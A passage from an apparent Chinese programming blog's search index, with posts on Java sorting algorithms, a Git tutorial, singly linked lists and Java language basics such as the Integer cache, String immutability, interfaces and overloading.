    <content type="text"><![CDATA[基本思想归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法的一个非常典型的应用。首先考虑下如何将2个有序数列合并。这个非常简单，只要从比较2个数列的第一个数，谁小就先取谁，取了后就在对应数列中删除这个数。然后再进行比较，如果有数列为空，那直接将另一个数列的数据依次取出即可。 java代码实现123456789public static void merge_sort(int a[],int first,int last,int temp[])&#123; if(first &lt; last)&#123; int middle = (first + last)/2; merge_sort(a,first,middle,temp);//左半部分排好序 merge_sort(a,middle+1,last,temp);//右半部分排好序 mergeArray(a,first,middle,last,temp); //合并左右部分 &#125;&#125; 123456789101112131415161718192021222324252627282930313233//合并 ：将两个序列a[first-middle],a[middle+1-end]合并public static void mergeArray(int a[],int first,int middle,int end,int temp[])&#123; int i = first; int m = middle; int j = middle+1; int n = end; int k = 0; while(i&lt;=m &amp;&amp; j&lt;=n)&#123; if(a[i] &lt;= a[j])&#123; temp[k] = a[i]; k++; i++; &#125;else&#123; temp[k] = a[j]; k++; j++; &#125; &#125; while(i&lt;=m)&#123; temp[k] = a[i]; k++; i++; &#125; while(j&lt;=n)&#123; temp[k] = a[j]; k++; j++; &#125; for(int ii=0;ii&lt;k;ii++)&#123; a[first + ii] = temp[ii]; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速排序]]></title>
    <url>%2F2017%2F11%2F02%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基本思想 先从数列中取出一个数作为key值； 将比这个数小的数全部放在它的左边，大于或等于它的数全部放在它的右边； 对左右两个小数列重复第二步，直至各区间只有1个数。 java代码实现12345678910111213141516171819202122232425262728public static void quickSort(int a[],int l,int r)&#123; if(l&gt;=r) return; int i = l; int j = r; int key = a[l];//选择第一个数为key while(i&lt;j)&#123; while(i&lt;j &amp;&amp; a[j]&gt;=key)//从右向左找第一个小于key的值 j--; if(i&lt;j)&#123; a[i] = a[j]; i++; &#125; while(i&lt;j &amp;&amp; a[i]&lt;key)//从左向右找第一个大于key的值 i++; if(i&lt;j)&#123; a[j] = a[i]; j--; &#125; &#125; //i == j a[i] = key; quickSort(a, l, i-1);//递归调用 quickSort(a, i+1, r);//递归调用 &#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git]]></title>
    <url>%2F2017%2F11%2F01%2FGit%2F</url>
    <content type="text"><![CDATA[集中式与分布式Git 属于分布式版本控制系统，而 SVN 属于集中式。 集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。 集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。 集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件的会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。 分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。 中心服务器中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。 Github 就是一个中心服务器。 工作流新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。 Git 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 中存有所有分支，使用一个 HEAD 指针指向当前分支。 git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset – files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files git checkout – files 使用暂存区的修改覆盖工作目录，用来撤销本地修改 可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。 git commit -a 直接把所有文件的修改添加到暂存区然后执行提交 git checkout HEAD – files 取出最后一次修改，可以用来进行回滚操作 分支实现使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。 新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支表示新分支成为当前分支。 每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。 合并分支也只需要改变指针即可。 冲突当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。 Git 会使用 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ，======= ，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADCreating a new branch is quick &amp; simple.=======Creating a new branch is quick AND simple.&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1 Fast forward“快进式合并”（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。 可以在合并时加上 –no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。 1$ git merge --no-ff -m &quot;merge with no-ff&quot; dev 分支管理策略master 分支应该是非常稳定的，只用来发布新版本； 日常开发在开发分支 dev 上进行。 储藏（Stashing）在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。 可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈上，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。 123$ git stashSaved working directory and index state \ &quot;WIP on master: 049d078 added the index file&quot;HEAD is now at 049d078 added the index file (To restore them type &quot;git stash apply&quot;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。 SSH 传输设置Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。 如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key： 1$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 然后把公钥 id_rsa.pub 的内容复制到 Github “Account settings” 的 SSH Keys 中。 .gitignore 文件忽略以下文件： 操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。 不需要全部自己编写，可以到 https://github.com/github/gitignore 中进行查询。 Git 命令一览]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[插入排序]]></title>
    <url>%2F2017%2F11%2F01%2F%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基本思想在要排序的一组数中，假定前n-1个数已经排好序，现在将第n个数插到前面的有序数列中，使得这n个数也是排好顺序的。如此反复循环，直到全部排好顺序。 平均时间复杂度O(n2) java代码实现12345678910111213141516public static void insert_sort(int array[],int lenth)&#123; int temp; for(int i=0;i&lt;lenth-1;i++)&#123; for(int j=i+1;j&gt;0;j--)&#123; if(array[j] &lt; array[j-1])&#123; temp = array[j-1]; array[j-1] = array[j]; array[j] = temp; &#125;else&#123; //不需要交换 break; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[选择排序]]></title>
    <url>%2F2017%2F11%2F01%2F%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基本思想在长度为N的无序数组中，第一次遍历n-1个数，找到最小的数值与第一个元素交换；第二次遍历n-2个数，找到最小的数值与第二个元素交换；。。。第n-1次遍历，找到最小的数值与第n-1个元素交换，排序完成。 平均时间复杂度O(n2) java代码实现1234567891011121314151617public static void select_sort(int array[],int lenth)&#123; for(int i=0;i&lt;lenth-1;i++)&#123; int minIndex = i; for(int j=i+1;j&lt;lenth;j++)&#123; if(array[j]&lt;array[minIndex])&#123; minIndex = j; &#125; &#125; if(minIndex != i)&#123; int temp = array[i]; array[i] = array[minIndex]; array[minIndex] = temp; &#125; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单链表]]></title>
    <url>%2F2017%2F09%2F15%2F%E5%8D%95%E9%93%BE%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[概览 本片博客将介绍以下内容 单链表的结构； 单链表中执行遍历，插入和删除操作； 单链表中不同操作的时间复杂度。 单链表的简介 链表是一种线性数据结构，它通过引用字段将所有分离的元素链接在一起。 下面是一个单链表的例子： 蓝色箭头显示单个链接列表中的结点是如何组合在一起的。 单链表的节点结构123456// Definition for singly-linked list.public class SinglyListNode &#123; int val; SinglyListNode next; SinglyListNode(int x) &#123; val = x; &#125;&#125; 在大多数情况下，我们将使用头结点(第一个结点)来表示整个列表。 添加操作 - 单链表如果我们想在给定的结点 prev 之后添加新值，我们应该： 使用给定值初始化新结点 cur； 将 cur 的“next”字段链接到 prev 的下一个结点 next； 将 prev 中的“next”字段链接到 cur 。 与数组不同，我们不需要将所有元素移动到插入元素之后。因此，您可以在 O(1) 时间复杂度中将新结点插入到链表中，这非常高效。 示例 让我们在第二个结点 6 之后插入一个新的值 9。 我们将首先初始化一个值为 9 的新结点。然后将结点 9 链接到结点 15。最后，将结点 6 链接到结点 9。 插入之后，我们的链表将如下所示： 在开头添加结点众所周知，我们使用头结点来代表整个列表。 因此，在列表开头添加新节点时更新头结点 head 至关重要。 初始化一个新结点 cur； 将新结点链接到我们的原始头结点 head。 将 cur 指定为 head。 例如，让我们在列表的开头添加一个新结点 9。 我们初始化一个新结点 9 并将其链接到当前头结点 23。 指定结点 9 为新的头结点。 删除操作 - 单链表如果我们想从单链表中删除现有结点 cur，可以分两步完成： 找到 cur 的上一个结点 prev 及其下一个结点 next； 接下来链接 prev 到 cur 的下一个节点 next。 在我们的第一步中，我们需要找出 prev 和 next。使用 cur 的参考字段很容易找出 next，但是，我们必须从头结点遍历链表，以找出 prev，它的平均时间是 O(N)，其中 N 是链表的长度。因此，删除结点的时间复杂度将是 O(N)。 空间复杂度为 O(1)，因为我们只需要常量空间来存储指针。 示例 让我们尝试把结点 6从上面的单链表中删除。 从头遍历链表，直到我们找到前一个结点 prev，即结点 23 将 prev（结点 23）与 next（结点 15）链接 结点 6 现在不在我们的单链表中。 删除第一个结点如果我们想删除第一个结点，策略会有所不同。 正如之前所提到的，我们使用头结点 head 来表示链表。我们的头是下面示例中的黑色结点 23。 如果想要删除第一个结点，我们可以简单地将下一个结点分配给 head。也就是说，删除之后我们的头将会是结点 6。 链表从头结点开始，因此结点 23 不再在我们的链表中。 单链表java实现实现单链表数据结构1234567public class Node&#123; Int data; Node next; public Node()&#123; this.next = null; &#125;&#125; 头插法建立链表12345678910public Node insert_head(int[] arr,Node h)&#123; for(int i = 0; i &lt; arr.length; i++)&#123; Node p = new Node(); p.data = arr[i]; p.next = h.next;//改变指针 h.next = p;//使h的直接后继为p &#125; return h.next;//去掉伪结点 &#125; 获取单链表长度12345678910111213public static int size(Node h) &#123; if (h == null) &#123; return 0; &#125; else &#123; int count = 1; Node p = h.next; while (p != null) &#123; count++; p = p.next; &#125; return count; &#125; &#125; 插入一个节点12345678910111213public static Node insert(int data, Node p) &#123; Node x = new Node(); x.data = data; if (p == null) &#123; p = x; &#125; else &#123; x.data = data; x.next = p.next; p.next = x; &#125; return p; &#125; 删除一个结点1234567891011public Node remove(Node h) &#123; Node p; if (h != null &amp;&amp; h.next != null) &#123; p = h.next; h.next = p.next;//指向p的直接后继结点 return h; &#125; else &#123; return null; &#125; &#125; 按值查找结点1234567891011121314public static Node search(int data, Node h) &#123; if (h == null) &#123; return null; &#125; else if (h.next == null) &#123; return h; &#125; else &#123; Node p = h.next; while (p.data != data) &#123; p = p.next; &#125; return p; &#125; &#125; 遍历链表123456789101112public void display(Node h) &#123; if (h == null) &#123; System.out.println(&quot;h is null&quot;); &#125; else if (h.next == null) &#123; System.out.print(h.data); &#125; else &#123; while (h != null) &#123; System.out.print(h.next.data + &quot; &quot;);//不遍历头结点 h = h.next; &#125; &#125; &#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[冒泡排序]]></title>
    <url>%2F2017%2F09%2F13%2F%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基本思想两个数比较大小，较大的数下沉，较小的数冒起来。 过程 比较相邻的两个数据，如果第二个数小，就交换位置。 从后向前两两比较，一直到比较最前两个数据。最终最小数被交换到起始的位置，这样第一个最小数的位置就排好了。 继续重复上述过程，依次将第2.3…n-1个最小数排好位置。 平均时间复杂度O(n2) java代码实现1234567891011121314public static void BubbleSort(int [] arr)&#123; int temp;//临时变量 for(int i=0; i&lt;arr.length-1; i++)&#123; //表示趟数，一共arr.length-1次。 for(int j=arr.length-1; j&gt;i; j--)&#123; if(arr[j] &lt; arr[j-1])&#123; temp = arr[j]; arr[j] = arr[j-1]; arr[j-1] = temp; &#125; &#125; &#125; &#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java基础]]></title>
    <url>%2F2017%2F09%2F05%2Fjava%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[一、数据类型基本类型 byte/8 char/16 short/16 int/32 float/32 long/64 double/64 boolean/~ boolean 只有两个值：true、false，可以使用 1 bit 来存储，但是具体大小没有明确规定。JVM 会在编译时期将 boolean 类型的数据转换为 int，使用 1 来表示 true，0 表示 false。JVM 支持 boolean 数组，但是是通过读写 byte 数组来实现的。 Primitive Data Types The Java® Virtual Machine Specification 包装类型基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。 12Integer x = 2; // 装箱int y = x; // 拆箱 缓存池new Integer(123) 与 Integer.valueOf(123) 的区别在于： new Integer(123) 每次都会新建一个对象； Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。 1234567891011121314151617181920212223242526272829static final int low = -128;static final int high;static final Integer cache[];static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127;&#125; 编译器会在自动装箱过程调用 valueOf() 方法，因此多个值相同且值在缓存池范围内的 Integer 实例使用自动装箱来创建，那么就会引用相同的对象。 123Integer m = 123;Integer n = 123;System.out.println(m == n); // true 基本类型对应的缓冲池如下： boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \u0000 to \u007F 在使用这些基本类型对应的包装类型时，就可以直接使用缓冲池中的对象。 StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 二、String概览String 被声明为 final，因此它不可被继承。 在 Java 8 中，String 内部使用 char 数组存储数据。 12345public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[];&#125; 在 Java 9 之后，String 类的实现改用 byte 数组存储字符串，同时使用 coder 来标识使用了哪种编码。 12345678public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final byte[] value; /** The identifier of the encoding used to encode the bytes in &#123;@code value&#125;. */ private final byte coder;&#125; value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。 不可变的好处1. 可以缓存 hash 值 因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。 2. String Pool 的需要 如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。 3. 安全性 String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。 4. 线程安全 String 不可变性天生具备线程安全，可以在多个线程中安全地使用。 Program Creek : Why String is immutable in Java? String, StringBuffer and StringBuilder1. 可变性 String 不可变 StringBuffer 和 StringBuilder 可变 2. 线程安全 String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 进行同步 StackOverflow : String, StringBuffer, and StringBuilder String Pool字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中。 当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。 下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。 123456String s1 = new String("aaa");String s2 = new String("aaa");System.out.println(s1 == s2); // falseString s3 = s1.intern();String s4 = s1.intern();System.out.println(s3 == s4); // true 如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。 123String s5 = "bbb";String s6 = "bbb";System.out.println(s5 == s6); // true 在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。 StackOverflow : What is String interning? 深入解析 String#intern new String(“abc”)使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。 “abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 “abc” 字符串字面量； 而使用 new 的方式会在堆中创建一个字符串对象。 创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。 12345public class NewStringTest &#123; public static void main(String[] args) &#123; String s = new String("abc"); &#125;&#125; 使用 javap -verbose 进行反编译，得到以下内容： 123456789101112131415161718192021// ...Constant pool:// ... #2 = Class #18 // java/lang/String #3 = String #19 // abc// ... #18 = Utf8 java/lang/String #19 = Utf8 abc// ... public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=2, args_size=1 0: new #2 // class java/lang/String 3: dup 4: ldc #3 // String abc 6: invokespecial #4 // Method java/lang/String."&lt;init&gt;":(Ljava/lang/String;)V 9: astore_1// ... 在 Constant Pool 中，#19 存储这字符串字面量 “abc”，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。 以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。 1234public String(String original) &#123; this.value = original.value; this.hash = original.hash;&#125; 三、运算参数传递Java 的参数是以值传递的形式传入方法中，而不是引用传递。 以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。因此在方法中使指针引用其它对象，那么这两个指针此时指向的是完全不同的对象，在一方改变其所指向对象的内容时对另一方没有影响。 1234567891011121314151617181920public class Dog &#123; String name; Dog(String name) &#123; this.name = name; &#125; String getName() &#123; return this.name; &#125; void setName(String name) &#123; this.name = name; &#125; String getObjectAddress() &#123; return super.toString(); &#125;&#125; 12345678910111213141516public class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog("A"); System.out.println(dog.getObjectAddress()); // Dog@4554617c func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c System.out.println(dog.getName()); // A &#125; private static void func(Dog dog) &#123; System.out.println(dog.getObjectAddress()); // Dog@4554617c dog = new Dog("B"); System.out.println(dog.getObjectAddress()); // Dog@74a14482 System.out.println(dog.getName()); // B &#125;&#125; 如果在方法中改变对象的字段值会改变原对象该字段值，因为改变的是同一个地址指向的内容。 1234567891011class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog("A"); func(dog); System.out.println(dog.getName()); // B &#125; private static void func(Dog dog) &#123; dog.setName("B"); &#125;&#125; StackOverflow: Is Java “pass-by-reference” or “pass-by-value”? float 与 doubleJava 不能隐式执行向下转型，因为这会使得精度降低。 1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。 1// float f = 1.1; 1.1f 字面量才是 float 类型。 1float f = 1.1f; 隐式类型转换因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型下转型为 short 类型。 12short s1 = 1;// s1 = s1 + 1; 但是使用 += 或者 ++ 运算符可以执行隐式类型转换。 12s1 += 1;// s1++; 上面的语句相当于将 s1 + 1 的计算结果进行了向下转型： 1s1 = (short) (s1 + 1); StackOverflow : Why don’t Java’s +=, -=, *=, /= compound assignment operators require casting? switch从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。 123456789String s = "a";switch (s) &#123; case "a": System.out.println("aaa"); break; case "b": System.out.println("bbb"); break;&#125; switch 不支持 long，是因为 switch 的设计初衷是对那些只有少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。 123456789// long x = 111;// switch (x) &#123; // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'// case 111:// System.out.println(111);// break;// case 222:// System.out.println(222);// break;// &#125; StackOverflow : Why can’t your switch statement data type be long, Java? 四、继承访问权限Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。 可以对类或类中的成员（字段以及方法）加上访问修饰符。 类可见表示其它类可以用这个类创建实例对象。 成员可见表示其它类可以用这个类的实例对象访问到该成员； protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。 设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。 如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。 字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。 123public class AccessExample &#123; public String id;&#125; 可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。 123456789101112public class AccessExample &#123; private int id; public String getId() &#123; return id + ""; &#125; public void setId(String id) &#123; this.id = Integer.valueOf(id); &#125;&#125; 但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。 12345678910111213141516public class AccessWithInnerClassExample &#123; private class InnerClass &#123; int x; &#125; private InnerClass innerClass; public AccessWithInnerClassExample() &#123; innerClass = new InnerClass(); &#125; public int getValue() &#123; return innerClass.x; // 直接访问 &#125;&#125; 抽象类与接口1. 抽象类 抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。 抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。 1234567891011public abstract class AbstractClassExample &#123; protected int x; private int y; public abstract void func1(); public void func2() &#123; System.out.println("func2"); &#125;&#125; 123456public class AbstractExtendClassExample extends AbstractClassExample &#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 123// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiatedAbstractClassExample ac2 = new AbstractExtendClassExample();ac2.func1(); 2. 接口 接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。 从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。 接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。 接口的字段默认都是 static 和 final 的。 123456789101112131415public interface InterfaceExample &#123; void func1(); default void func2()&#123; System.out.println("func2"); &#125; int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here&#125; 123456public class InterfaceImplementExample implements InterfaceExample &#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 1234// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiatedInterfaceExample ie2 = new InterfaceImplementExample();ie2.func1();System.out.println(InterfaceExample.x); 3. 比较 从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。 4. 使用选择 使用接口： 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法； 需要使用多重继承。 使用抽象类： 需要在几个相关的类中共享代码。 需要能控制继承来的成员的访问权限，而不是都为 public。 需要继承非静态和非常量字段。 在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。 Abstract Methods and Classes 深入理解 abstract class 和 interface When to Use Abstract Class and Interface super 访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而委托父类完成一些初始化的工作。 访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。 1234567891011121314public class SuperExample &#123; protected int x; protected int y; public SuperExample(int x, int y) &#123; this.x = x; this.y = y; &#125; public void func() &#123; System.out.println("SuperExample.func()"); &#125;&#125; 123456789101112131415public class SuperExtendExample extends SuperExample &#123; private int z; public SuperExtendExample(int x, int y, int z) &#123; super(x, y); this.z = z; &#125; @Override public void func() &#123; super.func(); System.out.println("SuperExtendExample.func()"); &#125;&#125; 12SuperExample e = new SuperExtendExample(1, 2, 3);e.func(); 12SuperExample.func()SuperExtendExample.func() Using the Keyword super 重写与重载1. 重写（Override） 存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。 为了满足里式替换原则，重写有有以下两个限制： 使用 @Override 注解，可以让编译器帮忙检查是否满足上面的三个限制条件。 下面的示例中，SubClass 为 SuperClass 的子类，SubClass 重写了 SuperClass 的 func() 方法。其中： 子类方法访问权限为 public，大于父类的 protected。 子类的返回类型为 ArrayList，是父类返回类型 List 的子类。 子类抛出的异常类型为 Exception，是父类抛出异常 Throwable 的子类。 子类重写方法使用 @Override 注解，从而让编译器自动检查是否满足限制条件。 123456789101112class SuperClass &#123; protected List&lt;Integer&gt; func() throws Throwable &#123; return new ArrayList&lt;&gt;(); &#125;&#125;class SubClass extends SuperClass &#123; @Override public ArrayList&lt;Integer&gt; func() throws Exception &#123; return new ArrayList&lt;&gt;(); &#125;&#125; 2. 重载（Overload） 存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。 应该注意的是，返回值不同，其它都相同不算是重载。 3. 实例 12345678910111213141516171819202122232425class A &#123; public String show(D obj) &#123; return ("A and D"); &#125; public String show(A obj) &#123; return ("A and A"); &#125;&#125;class B extends A &#123; public String show(B obj) &#123; return ("B and B"); &#125; public String show(A obj) &#123; return ("B and A"); &#125;&#125;class C extends B &#123;&#125;class D extends B &#123;&#125; 12345678910111213141516171819public class Test &#123; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new B(); B b = new B(); C c = new C(); D d = new D(); System.out.println(a1.show(b)); // A and A System.out.println(a1.show(c)); // A and A System.out.println(a1.show(d)); // A and D System.out.println(a2.show(b)); // B and A System.out.println(a2.show(c)); // B and A System.out.println(a2.show(d)); // A and D System.out.println(b.show(b)); // B and B System.out.println(b.show(c)); // B and B System.out.println(b.show(d)); // A 